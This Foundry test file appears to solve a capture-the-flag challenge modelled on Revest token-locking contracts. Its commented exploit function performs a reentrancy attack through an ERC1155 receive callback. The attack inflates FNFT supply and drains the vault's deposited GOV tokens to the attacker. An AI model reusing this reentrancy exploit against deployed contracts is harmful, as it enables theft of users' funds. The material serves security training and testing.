// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {Revest} from "src/degen-jackpot/Revest.sol";
import {LockManager} from "src/degen-jackpot/LockManager.sol";
import {TokenVault} from "src/degen-jackpot/TokenVault.sol";
import {FNFTHandler} from "src/degen-jackpot/FNFTHandler.sol";
import {AddressRegistry} from "src/degen-jackpot/OtherContracts.sol";
import {IRevest} from "src/degen-jackpot/OtherInterfaces.sol";

import {DegenJackpotAttack} from "./AttackContracts/18-DegenJackpotAttack.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    Token gov;
    Revest revest;
    LockManager lockManager;
    TokenVault tokenVault;
    FNFTHandler fnftHandler;
    AddressRegistry addressRegistry;

    DegenJackpotAttack attackContract;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        gov = new Token("GOV", "GOV");

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = adminUser;
        addresses[1] = attacker;
        amounts[0] = 100_000e18;
        amounts[1] = 1e18;
        vm.prank(admin);
        gov.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        addressRegistry = new AddressRegistry();

        vm.prank(admin);
        revest = new Revest(address(addressRegistry));

        vm.prank(admin);
        lockManager = new LockManager(address(addressRegistry));

        vm.prank(admin);
        tokenVault = new TokenVault(address(addressRegistry));

        vm.prank(admin);
        fnftHandler = new FNFTHandler(address(addressRegistry));

        vm.startPrank(admin);
        addressRegistry.setLockManager(address(lockManager));
        addressRegistry.setTokenVault(address(tokenVault));
        addressRegistry.setRevestFNFT(address(fnftHandler));
        addressRegistry.setRevest(address(revest));
        vm.stopPrank();

        // --adminUser deposits GOV token into Revest vault
        vm.prank(adminUser);
        gov.approve(address(revest), 100_000e18);

        address[] memory recipients = new address[](1);
        recipients[0] = adminUser;
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 100;
        bytes memory arguments;

        IRevest.FNFTConfig memory fnftConfig;
        fnftConfig.asset = address(gov);
        fnftConfig.depositAmount = 1_000e18;

        vm.prank(adminUser);
        revest.mintAddressLock(adminUser, arguments, recipients, quantities, fnftConfig);
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        // deploy attack contract and transfer GOV tokens to it
        attackContract = new DegenJackpotAttack(gov, revest);
        gov.transfer({to: address(attackContract), amount: gov.balanceOf(attacker)});

        // variables for `mintAddressLock`
        address[] memory _recipients = new address[](1);
        _recipients[0] = address(attackContract);
        uint256[] memory _quantities = new uint256[](1);
        _quantities[0] = 2;
        bytes memory _arguments;
        IRevest.FNFTConfig memory _fnftConfig;
        _fnftConfig.asset = address(gov);
        _fnftConfig.depositAmount = 0;

        // we mint 2 ERC1155s, each have 0 ERC20 tokens, fnftId=1 -> state vars updated: supply[1] += 2, fnftsCreated += 1
        revest.mintAddressLock({
            trigger: address(attackContract),
            arguments: _arguments,
            recipients: _recipients,
            quantities: _quantities,
            fnftConfig: _fnftConfig
        });

        // enable the attack contract to reenter `Revest` inside `onERC1155Received`
        attackContract.setCallbackTrue();

        // update quantites to the amount we want to steal
        _quantities[0] = 100_001;

        // fnftId=2, this time state vars updated: supply[2] += 100_001 and fnftsCreated will not be updated because we reenter first
        revest.mintAddressLock({
            trigger: address(attackContract),
            arguments: _arguments,
            recipients: _recipients,
            quantities: _quantities,
            fnftConfig: _fnftConfig
        });

        attackContract.getGov();

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker acquires all GOV tokens that were deposited into the Revest contract
        assertEq(gov.balanceOf(address(tokenVault)), 0);
        assertEq(gov.balanceOf(attacker), 100_001e18);
    }
}
